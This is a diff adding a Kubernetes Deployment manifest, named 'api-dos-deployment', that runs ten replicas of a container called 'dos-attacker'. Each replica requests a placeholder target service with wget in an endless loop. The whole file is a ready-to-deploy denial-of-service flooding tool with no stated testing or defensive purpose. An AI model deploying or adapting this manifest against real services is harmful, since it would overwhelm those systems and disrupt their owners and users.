@@ -1,0 +1,27 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: api-dos-deployment
+  labels:
+    app: api-dos
+spec:
+  replicas: 10  # Adjust replicas as needed
+  selector:
+    matchLabels:
+      app: api-dos
+  template:
+    metadata:
+      labels:
+        app: api-dos
+    spec:
+      containers:
+      - name: dos-attacker
+        image: alpine:latest
+        command: ["/bin/sh", "-c"]
+        args:
+          - while true; do wget -q -O- http://<TARGET-SERVICE>:<TARGET-PORT>; done
+        resources:
+          limits:
+            cpu: "500m"
+            memory: "256Mi"
+      restartPolicy: Always
